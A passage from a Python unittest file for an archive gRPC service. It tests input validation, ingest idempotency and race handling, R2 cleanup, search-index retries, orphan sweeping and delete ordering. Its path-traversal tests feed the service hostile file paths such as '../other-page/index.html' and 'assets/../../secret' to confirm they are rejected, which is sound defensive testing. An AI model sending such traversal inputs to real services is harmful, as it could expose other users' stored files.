        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetPageContent(
            archive_pb2.GetPageContentRequest(page_id="p1", user_id=""), ctx
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2.return_value.presign.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_archive_file_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="", file_path="index.html",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()


# ---------------------------------------------------------------------------
# Path traversal hardening (2.8)
# ---------------------------------------------------------------------------

class TestPathTraversalHardening(unittest.TestCase):
    def _svc_with_owner_page(self, mock_db_session):
        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None
        return page

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_leading_traversal_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="../other-page/index.html",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_embedded_traversal_normalizing_to_dotdot_rejected(
        self, mock_engine, mock_db_session, mock_r2_cls
    ):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()

        for path in ("a/../../x", "assets/../../secret", "..", "a/../.."):
            ctx = _FakeContext()
            svc.GetArchiveFile(
                archive_pb2.GetArchiveFileRequest(
                    page_id="p1", user_id="u1", file_path=path,
                ),
                ctx,
            )
            self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT, path)
            mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_absolute_path_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="/abs",
            ),
            ctx,
        )
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
        mock_r2_cls.return_value.client.get_object.assert_not_called()

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_benign_inner_dotdot_path_resolves_within_root(
        self, mock_engine, mock_db_session, mock_r2_cls
    ):
        """a/../b normalizes to b — inside the root, so allowed."""
        from servicer import ArchiveServicer

        self._svc_with_owner_page(mock_db_session)
        mock_r2 = MagicMock()
        mock_r2.bucket = "b"
        mock_r2.client.get_object.return_value = {
            "Body": MagicMock(**{"read.return_value": b"x"}),
            "ContentType": "text/plain",
        }
        mock_r2_cls.return_value = mock_r2
        svc = ArchiveServicer()
        ctx = _FakeContext()
        svc.GetArchiveFile(
            archive_pb2.GetArchiveFileRequest(
                page_id="p1", user_id="u1", file_path="assets/../index.html",
            ),
            ctx,
        )
        self.assertIsNone(ctx._code)
        mock_r2.client.get_object.assert_called_once_with(
            Bucket="b", Key="u1/p1/index.html",
        )


# ---------------------------------------------------------------------------
# Per-user ingest idempotency (2.6) — real SQLite DB
# ---------------------------------------------------------------------------

class TestPerUserIdempotency(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()
        self.r2_patcher = patch("servicer.R2Client")
        self.mock_r2_cls = self.r2_patcher.start()
        self.mock_r2_cls.return_value = MagicMock()
        self.search_patcher = patch("servicer._get_search_stub", return_value=None)
        self.search_patcher.start()

    def tearDown(self):
        self.search_patcher.stop()
        self.r2_patcher.stop()
        self.engine_patcher.stop()

    def _ingest(self, user_id, job_id):
        from servicer import ArchiveServicer
        svc = ArchiveServicer()
        return svc.IngestPage(
            _build_ingest_request(user_id=user_id, extension_job_id=job_id),
            _FakeContext(),
        )

    def test_same_user_replay_returns_existing_page(self):
        r1 = self._ingest("uA", "job-1")
        r2 = self._ingest("uA", "job-1")
        self.assertEqual(r1.page_id, r2.page_id)
        # Only one set of uploads (1 asset + html + meta happens once;
        # here assets are empty so 2 uploads for the first ingest, 0 for replay)
        self.assertEqual(self.mock_r2_cls.return_value.upload.call_count, 2)

    def test_same_job_id_across_users_creates_distinct_pages(self):
        r_a = self._ingest("uA", "job-shared")
        r_b = self._ingest("uB", "job-shared")
        self.assertNotEqual(r_a.page_id, r_b.page_id)
        self.assertTrue(r_b.success)

        from models import Page
        from sqlalchemy import select

        with db_session(self.engine) as session:
            rows = session.execute(
                select(Page).where(Page.extension_job_id == "job-shared")
            ).scalars().all()
            self.assertEqual(len(rows), 2)
            self.assertEqual({r.user_id for r in rows}, {"uA", "uB"})
            page_a = session.execute(
                select(Page).where(Page.id == r_a.page_id)
            ).scalar_one()
            self.assertEqual(page_a.user_id, "uA")

    def test_composite_unique_enforced_in_schema(self):
        """The (user_id, extension_job_id) pair is unique, not the job id alone."""
        from models import Page
        from sqlalchemy import create_engine as ce
        from sqlalchemy.exc import IntegrityError

        eng = ce("sqlite://")
        Base.metadata.create_all(eng)
        with db_session(eng) as session:
            session.add(Page(id="x1", user_id="uA", url="http://a", title="t",
                             r2_key="k", extension_job_id="j"))
        with db_session(eng) as session:
            # Same job id, different user → allowed
            session.add(Page(id="x2", user_id="uB", url="http://b", title="t",
                             r2_key="k", extension_job_id="j"))
        with self.assertRaises(IntegrityError), db_session(eng) as session:
            session.add(Page(id="x3", user_id="uA", url="http://c", title="t",
                             r2_key="k", extension_job_id="j"))


# ---------------------------------------------------------------------------
# Failed-ingest R2 cleanup + quota rollback (2.9)
# ---------------------------------------------------------------------------

class TestFailedIngestCleanup(unittest.TestCase):
    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.refund_quota")
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_upload_failure_cleans_prefix_and_releases_reservation(
        self, mock_engine, mock_db_session, mock_r2_cls, mock_refund, mock_search
    ):
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        r2 = MagicMock()
        # First asset upload succeeds, second fails
        r2.upload.side_effect = [None, RuntimeError("R2 exploded")]
        mock_r2_cls.return_value = r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = _build_ingest_request(assets=[
            archive_pb2.Asset(filename="a.jpg", content_type="image/jpeg", data=b"1"),
            archive_pb2.Asset(filename="b.jpg", content_type="image/jpeg", data=b"2"),
        ])

        with self.assertRaises(RuntimeError):
            svc.IngestPage(req, ctx)

        # The attempt's prefix was cleaned up best-effort
        prefix = r2.upload.call_args_list[0].args[0].rsplit("/assets/", 1)[0]
        r2.delete_prefix.assert_called_once_with(prefix)

        # The reservation was released (2.14)
        mock_refund.assert_called_once()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.refund_quota")
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_cleanup_failure_logged_not_fatal(
        self, mock_engine, mock_db_session, mock_r2_cls, mock_refund, mock_search
    ):
        """Spec: cleanup failure is logged, not fatal — original error still raised."""
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        r2 = MagicMock()
        r2.upload.side_effect = RuntimeError("R2 down")
        r2.delete_prefix.side_effect = Exception("cleanup also failed")
        mock_r2_cls.return_value = r2

        svc = ArchiveServicer()
        ctx = _FakeContext()

        with self.assertRaises(RuntimeError):  # original error, not the cleanup error
            svc.IngestPage(_build_ingest_request(), ctx)


# ---------------------------------------------------------------------------
# Reliable search indexing (3.8) — real SQLite DB
# ---------------------------------------------------------------------------

class TestReliableSearchIndexing(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()
        self.r2_patcher = patch("servicer.R2Client")
        self.r2_patcher.start()
        self.sleep_patcher = patch("servicer.time.sleep")
        self.sleep_patcher.start()

    def tearDown(self):
        self.sleep_patcher.stop()
        self.r2_patcher.stop()
        self.engine_patcher.stop()

    def _set_stub(self, stub):
        p = patch("servicer._get_search_stub", return_value=stub)
        p.start()
        self.addCleanup(p.stop)

    def _set_r2_html(self, html: bytes):
        """Serve `index.html` from the mocked R2 client (2.6 retry path)."""
        mock_r2 = MagicMock()
        mock_r2.bucket = "b"
        body = MagicMock()
        body.read.return_value = html
        mock_r2.client.get_object.return_value = {
            "Body": body, "ContentType": "text/html; charset=utf-8",
        }
        # The patcher in setUp already installed a MagicMock for R2Client;
        # reconfigure that installed mock (reassigning patcher.return_value
        # after start() does not rebind).
        servicer.R2Client.return_value = mock_r2

    def _ingest(self):
        from servicer import ArchiveServicer
        return ArchiveServicer().IngestPage(_build_ingest_request(), _FakeContext())

    def _page_row(self, page_id):
        from models import Page
        from sqlalchemy import select
        from sqlalchemy.orm import sessionmaker

        session = sessionmaker(bind=self.engine)()
        try:
            # Read before close: db_session's commit would expire instances.
            return session.execute(
                select(Page).where(Page.id == page_id)
            ).scalar_one().search_indexed
        finally:
            session.close()

    def test_index_success_marks_page_indexed(self):
        stub = MagicMock()
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 1)
        self.assertTrue(self._page_row(resp.page_id))

    def test_retry_then_succeed_marks_indexed(self):
        """IndexPage fails twice, then succeeds → pending flag cleared."""
        stub = MagicMock()
        stub.IndexPage.side_effect = [
            grpc.RpcError("unavailable"),  # attempt 1 (has .code? plain RpcError ok)
            grpc.RpcError("unavailable"),  # attempt 2
            None,                          # attempt 3 succeeds
        ]
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 3)
        self.assertTrue(self._page_row(resp.page_id))

    def test_permanent_failure_leaves_pending_flag(self):
        """Failures beyond the retry budget stay pending, never swallowed."""
        stub = MagicMock()
        stub.IndexPage.side_effect = grpc.RpcError("down")
        self._set_stub(stub)
        resp = self._ingest()
        self.assertEqual(stub.IndexPage.call_count, 3)  # bounded retries
        self.assertFalse(self._page_row(resp.page_id))

    def test_no_search_service_leaves_pending_flag(self):
        self._set_stub(None)
        resp = self._ingest()
        self.assertFalse(self._page_row(resp.page_id))

    def test_retry_pending_indexing_retries_and_clears(self):
        """The maintenance RPC retries pending rows and clears them on success."""
        from servicer import ArchiveServicer

        self._set_stub(None)
        resp = self._ingest()  # indexed=False (no search service)
        self._set_r2_html(b"<html><body><p>hello world</p></body></html>")
        self._set_stub(MagicMock())  # search service back up

        svc = ArchiveServicer()
        result = svc.RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual(result.retried, 1)
        self.assertEqual(result.succeeded, 1)
        self.assertTrue(self._page_row(resp.page_id))

    def test_retry_pending_indexing_counts_failures(self):
        from servicer import ArchiveServicer

        self._set_stub(None)
        self._ingest()
        self._set_r2_html(b"<html><body><p>hello world</p></body></html>")
        stub = MagicMock()
        stub.IndexPage.side_effect = grpc.RpcError("still down")
        self._set_stub(stub)

        result = ArchiveServicer().RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual(result.retried, 1)
        self.assertEqual(result.succeeded, 0)

    def test_retry_reindexes_full_body_from_r2_not_preview(self):
        """2.6/D7: the retry re-reads the authoritative HTML from R2 and
        indexes the complete body — never the 500-char preview_text."""
        from servicer import ArchiveServicer

        marker = "引" * 600  # 1800 bytes — a char-slice preview holds only 500
        html = f"<html><body><p>{marker}</p></body></html>".encode()

        self._set_stub(None)
        resp = self._ingest()
        self.assertFalse(self._page_row(resp.page_id))

        self._set_r2_html(html)
        stub = MagicMock()
        self._set_stub(stub)

        result = ArchiveServicer().RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual((result.retried, result.succeeded), (1, 1))

        sent = stub.IndexPage.call_args.args[0]
        self.assertIn(marker, sent.body_text)  # full body, not the preview
        self.assertTrue(self._page_row(resp.page_id))

        # The HTML was fetched from the page's authoritative R2 key
        servicer.R2Client.return_value.client.get_object.assert_called_once_with(
            Bucket="b", Key=f"u1/{resp.page_id}/index.html",
        )

    def test_retry_r2_miss_skips_cleanly_and_stays_pending(self):
        """2.6: a purged page (R2 miss) is skipped — not indexed from the
        preview, not marked indexed, no error surfaced."""
        from servicer import ArchiveServicer

        self._set_stub(None)
        resp = self._ingest()

        mock_r2 = MagicMock()
        mock_r2.bucket = "b"
        mock_r2.client.get_object.side_effect = Exception("NoSuchKey")
        servicer.R2Client.return_value = mock_r2

        stub = MagicMock()
        self._set_stub(stub)

        result = ArchiveServicer().RetryPendingIndexing(
            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
        )
        self.assertEqual((result.retried, result.succeeded), (1, 0))
        stub.IndexPage.assert_not_called()
        self.assertFalse(self._page_row(resp.page_id))


# ---------------------------------------------------------------------------
# Orphan sweep (5.9) — fake R2 + real SQLite DB
# ---------------------------------------------------------------------------

class _FakePaginator:
    def __init__(self, objects):
        self.objects = objects  # key -> LastModified datetime

    def paginate(self, Bucket=None, Prefix="", Delimiter=None, PaginationConfig=None):
        if Delimiter == "/":
            prefixes, contents = set(), []
            for key, mod in self.objects.items():
                if not key.startswith(Prefix):
                    continue
                rest = key[len(Prefix):]
                if "/" in rest:
                    prefixes.add(Prefix + rest.split("/", 1)[0] + "/")
                else:
                    contents.append({"Key": key, "LastModified": mod})
            yield {
                "CommonPrefixes": [{"Prefix": p} for p in sorted(prefixes)],
                "Contents": contents,
            }
        else:
            yield {
                "Contents": [
                    {"Key": k, "LastModified": self.objects[k]}
                    for k in sorted(self.objects)
                    if k.startswith(Prefix)
                ],
            }


class _FakeR2ForSweep:
    def __init__(self, objects):
        self.objects = dict(objects)
        self.bucket = "test-bucket"
        self.client = self
        self.deleted_keys = []

    def get_paginator(self, operation):
        return _FakePaginator(self.objects)

    def delete_objects(self, Bucket, Delete):
        for obj in Delete["Objects"]:
            self.deleted_keys.append(obj["Key"])
            self.objects.pop(obj["Key"], None)


class TestSweepOrphanR2Objects(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()

        from datetime import timedelta
        now = datetime.now(timezone.utc).replace(tzinfo=None)
        self.old = now - timedelta(days=8)      # older than the 7d grace
        self.fresh = now - timedelta(hours=1)   # in-flight ingest territory

        # The sweep only considers UUID-shaped page ids (defensive: never
        # delete objects it cannot map to a page identity).
        self.live_pid = "11111111-1111-4111-8111-111111111111"
        self.old_pid = "22222222-2222-4222-8222-222222222222"
        self.fresh_pid = "33333333-3333-4333-8333-333333333333"

        # u-existing/<live_pid>: row exists → never swept
        # u-orphan/<old_pid>: no row, old → swept
        # u-orphan/<fresh_pid>: no row, fresh (in-flight) → left in place
        self.objects = {
            f"u-existing/{self.live_pid}/index.html": self.old,
            f"u-existing/{self.live_pid}/assets/a.png": self.old,
            f"u-orphan/{self.old_pid}/index.html": self.old,
            f"u-orphan/{self.old_pid}/assets/a.png": self.old,
            f"u-orphan/{self.old_pid}/meta.json": self.old,
            f"u-orphan/{self.fresh_pid}/index.html": self.fresh,
            f"u-orphan/{self.old_pid}.webp": self.old,
            "u-notauuid/whatever/index.html": self.old,  # not a page uuid → untouched
        }
        self.r2 = _FakeR2ForSweep(self.objects)
        r2_patcher = patch("servicer.R2Client", return_value=self.r2)
        r2_patcher.start()
        self.addCleanup(r2_patcher.stop)

        from models import Page, UserQuota
        with db_session(self.engine) as session:
            session.add(Page(id=self.live_pid, user_id="u-existing", url="http://x",
                             title="t", r2_key=f"u-existing/{self.live_pid}/index.html"))
            session.add(UserQuota(user_id="u-orphan", pages_this_month=3,
                                  total_bytes=12345,
                                  quota_reset_at=now + timedelta(days=20)))

    def tearDown(self):
        self.engine_patcher.stop()

    def _sweep(self, **kw):
        from servicer import ArchiveServicer
        return ArchiveServicer().SweepOrphanR2Objects(
            archive_pb2.SweepOrphanR2ObjectsRequest(**kw), _FakeContext()
        )

    def test_orphaned_old_prefix_swept_and_live_left(self):
        from models import UserQuota
        from sqlalchemy import select

        resp = self._sweep()  # defaults: 7d grace

        # Deleted: the old orphan prefix (3 objects) + its old thumbnail
        self.assertEqual(set(self.r2.deleted_keys), {
            f"u-orphan/{self.old_pid}.webp",
            f"u-orphan/{self.old_pid}/assets/a.png",
            f"u-orphan/{self.old_pid}/index.html",
            f"u-orphan/{self.old_pid}/meta.json",
        })
        self.assertEqual(resp.deleted_objects, 4)
        self.assertEqual(resp.deleted_prefixes, 1)
        self.assertGreaterEqual(resp.scanned_prefixes, 3)

        # Live page objects untouched
        self.assertIn(f"u-existing/{self.live_pid}/index.html", self.r2.objects)
        # Fresh orphan (in-flight ingest) untouched
        self.assertIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)
        # Non-uuid folder untouched
        self.assertIn("u-notauuid/whatever/index.html", self.r2.objects)

        # Quota counters unchanged (quota-neutral)
        with db_session(self.engine) as session:
            quota = session.execute(
                select(UserQuota).where(UserQuota.user_id == "u-orphan")
            ).scalar_one()
            self.assertEqual(quota.total_bytes, 12345)
            self.assertEqual(quota.pages_this_month, 3)

    def test_short_grace_allows_fresh_deletion(self):
        self._sweep(grace_period_seconds=60)  # 1 minute grace
        # Fresh object is 1h old > 60s grace → now deletable
        self.assertNotIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)

    def test_long_grace_protects_everything(self):
        resp = self._sweep(grace_period_seconds=365 * 24 * 3600)
        self.assertEqual(resp.deleted_objects, 0)
        self.assertEqual(self.r2.deleted_keys, [])


# ---------------------------------------------------------------------------
# 2.1/D5 — ingest idempotency race: IntegrityError → re-select → idempotent
# success; loser's reservation released + R2 prefix cleaned.
# ---------------------------------------------------------------------------

class TestIngestRace(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory(prefix="pp-archive-race-")
        self.addCleanup(self._tmp.cleanup)
        from sqlalchemy import create_engine as ce
        # A real file DB: the deterministic case needs the loser's INSERT to
        # hit the committed winner's unique index; the threaded case needs
        # both threads to share one database (in-memory SQLite would not).
        self.engine = ce(f"sqlite:///{self._tmp.name}/archive.db")
        Base.metadata.create_all(self.engine)
        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
        self.engine_patcher.start()
        self.r2 = MagicMock()
        self.r2_patcher = patch("servicer.R2Client", return_value=self.r2)
        self.r2_patcher.start()
        self.search_patcher = patch("servicer._get_search_stub", return_value=None)
        self.search_patcher.start()

    def tearDown(self):
        self.search_patcher.stop()
        self.r2_patcher.stop()
        self.engine_patcher.stop()

    def _rows(self, job_id):
        from models import Page
        from sqlalchemy import select
        with db_session(self.engine) as session:
            rows = session.execute(
                select(Page).where(Page.extension_job_id == job_id)
            ).scalars().all()
            return [r.id for r in rows]  # read before the session closes

    def test_integrity_error_converges_on_winner(self):
        """The loser's INSERT hits the unique index at commit → adopt the
        winner's page_id, release the reservation, clean the loser's prefix."""
        from models import Page, UserQuota
        from quota import confirm_quota as real_confirm
        from sqlalchemy import select

        def racing_confirm(session, user_id, plan, request_size):
            # The concurrent winner commits its row while this ingest was
            # uploading; the real confirm then runs and this ingest's page
            # INSERT collides on (user_id, extension_job_id) at commit.
            with db_session(self.engine) as s:
                s.add(Page(id="winner-id", user_id="uA", url="https://winner",
                           title="w", r2_key="uA/winner-id/index.html",
                           extension_job_id="job-race"))
            return real_confirm(session, user_id, plan, request_size)

        with patch("servicer.confirm_quota", side_effect=racing_confirm):
            resp = ArchiveServicer().IngestPage(
                _build_ingest_request(user_id="uA", extension_job_id="job-race"),
                _FakeContext(),
            )

        self.assertTrue(resp.success)
        self.assertEqual(resp.page_id, "winner-id")
        self.assertEqual(len(self._rows("job-race")), 1)

        # The loser's just-uploaded prefix was cleaned up; the winner's kept.
        self.assertEqual(self.r2.delete_prefix.call_count, 1)
        loser_prefix = self.r2.delete_prefix.call_args.args[0]
        self.assertNotIn("winner-id", loser_prefix)

        # The loser's reservation was released (winner inserted raw, no quota).
        with db_session(self.engine) as session:
            q = session.execute(
                select(UserQuota).where(UserQuota.user_id == "uA")
            ).scalar_one()
            self.assertEqual((q.pages_this_month, q.total_bytes), (0, 0))

    def test_threads_same_job_converge(self):
        """Two concurrent ingests of the same (user, job id) → same page_id,
        one row, exactly one surviving R2 prefix."""

        barrier = threading.Barrier(2)
        results = []

        def run():
            barrier.wait()
            results.append(ArchiveServicer().IngestPage(
                _build_ingest_request(user_id="uT", extension_job_id="job-t"),
                _FakeContext(),
            ))

        threads = [threading.Thread(target=run) for _ in range(2)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=60)

        self.assertEqual(len(results), 2)
        for r in results:
            self.assertTrue(r.success)
        self.assertEqual(len({r.page_id for r in results}), 1)
        self.assertEqual(len(self._rows("job-t")), 1)
        self.assertEqual(results[0].page_id, self._rows("job-t")[0])

        # Exactly one R2 prefix survives (the winner's); the loser's uploads
        # were cleaned up — or the loser never got to upload (fast replay).
        def _prefix(key):
            parts = key.split("/")
            return "/".join(parts[:2])

        uploaded = {_prefix(c.args[0]) for c in self.r2.upload.call_args_list}
        deleted = {c.args[0] for c in self.r2.delete_prefix.call_args_list}
        survivors = uploaded - deleted
        self.assertEqual(survivors, {f"uT/{results[0].page_id}"})


# ---------------------------------------------------------------------------
# 2.2/D6 — delete ordering: row deletion + quota decrement commit FIRST, R2
# deletions afterwards.
# ---------------------------------------------------------------------------

class TestDeleteOrdering(unittest.TestCase):
    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer._get_share_stub", return_value=None)
    @patch("servicer._get_library_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_row_deletion_commits_before_r2_deletions(
        self, mock_engine, mock_db_session, mock_r2_cls, mock_lib,
        mock_share, mock_search,
    ):
        order = []
        page = _make_page(page_id="p1", user_id="u1", size_bytes=5000)
        quota_row = _make_quota_dict(user_id="u1", total_bytes=10000)
        mock_session = MagicMock()
        responses = [page, quota_row]

        def fake_execute(stmt):
            result = MagicMock()
            result.scalar_one_or_none.return_value = responses.pop(0)
            return result

        mock_session.execute = fake_execute
        mock_session.delete.side_effect = lambda p: order.append("row_delete")
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        r2 = mock_r2_cls.return_value
        r2.delete_prefix.side_effect = lambda p: order.append("r2_prefix")
        r2.delete.side_effect = lambda k: order.append("r2_thumb")

        svc = ArchiveServicer()
        resp = svc.DeletePage(
            archive_pb2.DeletePageRequest(page_id="p1", user_id="u1"), _FakeContext()
        )

        self.assertTrue(resp.success)
        self.assertEqual(order[0], "row_delete")
        self.assertEqual(order[1:], ["r2_prefix", "r2_thumb"])
        self.assertEqual(quota_row.total_bytes, 5000)  # decremented with the row

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer._get_share_stub", return_value=None)
    @patch("servicer._get_library_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_r2_failure_after_commit_still_succeeds(
        self, mock_engine, mock_db_session, mock_r2_cls, mock_lib,
        mock_share, mock_search,
    ):
        """Once the deletion is committed, an R2 outage must not fail the
        RPC — leftovers are sweepable orphans (logged)."""
        page = _make_page(page_id="p1", user_id="u1", size_bytes=5000)
        quota_row = _make_quota_dict(user_id="u1", total_bytes=10000)
        mock_session = MagicMock()
        responses = [page, quota_row]

        def fake_execute(stmt):
            result = MagicMock()
            result.scalar_one_or_none.return_value = responses.pop(0)
            return result

        mock_session.execute = fake_execute
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_r2_cls.return_value.delete_prefix.side_effect = Exception("r2 down")

        resp = ArchiveServicer().DeletePage(
            archive_pb2.DeletePageRequest(page_id="p1", user_id="u1"), _FakeContext()
        )
        self.assertTrue(resp.success)  # no zombie — the row is committed gone


# ---------------------------------------------------------------------------
# 2.4/2.9 — downstream delete notifications with explicit deadlines + pool
# ---------------------------------------------------------------------------

_RPC_TIMEOUT = 30.0


class TestDeleteNotifications(unittest.TestCase):
    def _delete(self, **stub_kwargs):
        search_stub = stub_kwargs.get("search", MagicMock())
        share_stub = stub_kwargs.get("share", MagicMock())
        library_stub = stub_kwargs.get("library", MagicMock())

        page = _make_page(page_id="p1", user_id="u1", size_bytes=100)
        quota_row = _make_quota_dict(user_id="u1", total_bytes=100)
        mock_session = MagicMock()
        responses = [page, quota_row]

        def fake_execute(stmt):
            result = MagicMock()
            result.scalar_one_or_none.return_value = responses.pop(0)
            return result

        mock_session.execute = fake_execute

        with patch("servicer._get_search_stub", return_value=search_stub), \
             patch("servicer._get_share_stub", return_value=share_stub), \
             patch("servicer._get_library_stub", return_value=library_stub), \
             patch("servicer.R2Client"), \
             patch("servicer.db_session") as mock_db_session, \
             patch("servicer.get_engine", return_value=MagicMock()):
            mock_db_session.return_value.__enter__ = lambda s: mock_session
            mock_db_session.return_value.__exit__ = lambda s, *a: None
            resp = ArchiveServicer().DeletePage(
                archive_pb2.DeletePageRequest(page_id="p1", user_id="u1"),
                _FakeContext(),
            )
        return resp, search_stub, share_stub, library_stub

    def test_all_three_notifications_carry_deadlines(self):
        resp, search, share, library = self._delete()
        self.assertTrue(resp.success)
        self.assertEqual(search.RemovePage.call_args.kwargs.get("timeout"), _RPC_TIMEOUT)
        self.assertEqual(share.RevokeLinksForPage.call_args.kwargs.get("timeout"), _RPC_TIMEOUT)
        self.assertEqual(library.PurgePageLinks.call_args.kwargs.get("timeout"), _RPC_TIMEOUT)

    def test_notification_failures_logged_not_fatal(self):
        search = MagicMock()
        search.RemovePage.side_effect = Exception("search down")
        share = MagicMock()
        share.RevokeLinksForPage.side_effect = grpc.RpcError("share down")
        library = MagicMock()
        library.PurgePageLinks.side_effect = RuntimeError("library down")

        resp, *_ = self._delete(search=search, share=share, library=library)
        self.assertTrue(resp.success)  # best-effort — delete already committed

    def test_revoke_request_carries_page_id(self):
        _, _, share, library = self._delete()
        self.assertEqual(share.RevokeLinksForPage.call_args.args[0].page_id, "p1")
        self.assertEqual(library.PurgePageLinks.call_args.args[0].page_id, "p1")


# ---------------------------------------------------------------------------
# 2.11/D8 — collection-scoped listing outage semantics
# ---------------------------------------------------------------------------

class TestCollectionOutage(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)
        p = patch("servicer.get_engine", return_value=self.engine)
        p.start()
        self.addCleanup(p.stop)
        r2p = patch("servicer.R2Client")
        r2p.start()
        self.addCleanup(r2p.stop)

        from models import Page
        with db_session(self.engine) as session:
            session.add(Page(id="p1", user_id="u1", url="http://a", title="A", r2_key="k"))
            session.add(Page(id="p2", user_id="u1", url="http://b", title="B", r2_key="k"))

        self.cache_set = patch("servicer.cache_set", return_value=None).start()
        self.addCleanup(self.cache_set.stop)
        self.cache_get = patch("servicer.cache_get", return_value=None).start()
        self.addCleanup(self.cache_get.stop)

    def _list(self, **kw):
        ctx = _FakeContext()
        resp = ArchiveServicer().ListPages(
            archive_pb2.ListPagesRequest(user_id="u1", page=1, page_size=20, **kw), ctx
        )
        return resp, ctx

    def test_library_rpc_failure_is_unavailable_and_never_cached(self):
        stub = MagicMock()
        stub.ListCollectionPageIds.side_effect = grpc.RpcError("connect failed")
        with patch("servicer._get_library_stub", return_value=stub), \
             self.assertLogs("servicer", level="WARNING") as logs:
            resp, ctx = self._list(collection_id="c1")

        self.assertEqual(ctx._code, grpc.StatusCode.UNAVAILABLE)
        self.assertEqual(resp.pages, [])
